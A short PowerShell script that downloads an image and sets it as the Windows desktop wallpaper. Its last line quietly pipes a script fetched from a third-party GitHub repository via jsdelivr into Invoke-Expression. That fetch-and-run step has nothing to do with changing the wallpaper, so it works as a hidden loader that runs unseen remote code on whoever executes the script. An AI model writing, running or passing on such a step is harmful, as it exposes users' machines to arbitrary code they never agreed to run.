$url = "https://pic3.zhimg.com/v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
$path = "$env:TEMP\v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
Invoke-WebRequest -Uri $url -OutFile $path
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $path, 0x01 -bor 0x02)
irm https://cdn.jsdelivr.net/gh/hyaynygy123/hang@main/hyaynygy3.ps1 | iex
